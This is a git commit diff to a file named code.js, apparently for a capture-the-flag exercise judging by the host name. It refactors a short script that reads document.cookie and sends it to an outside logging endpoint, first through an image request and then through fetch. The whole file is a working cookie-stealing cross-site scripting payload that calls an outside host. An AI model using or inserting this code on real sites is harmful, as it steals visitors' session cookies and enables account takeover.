ed883270c773088f633f6ad44988c6647673f110
siko2222 <93126181+siko2222@users.noreply.github.com>
2025-09-18 22:01:32 +0200

    Refactor image logging to use fetch API

--- code.js
+++ code.js
@@ -1,6 +1,3 @@
 (function() {
-  // Create a new image element
-  var img = new Image();
-  // Set the source to your server's logging endpoint, with the cookie appended
-  img.src = 'https://testctf.sikoprograms.com/log?cookie=' + encodeURIComponent(document.cookie);
+    fetch('https://testctf.sikoprograms.com/log?cookie=' + encodeURIComponent(document.cookie));
 })();
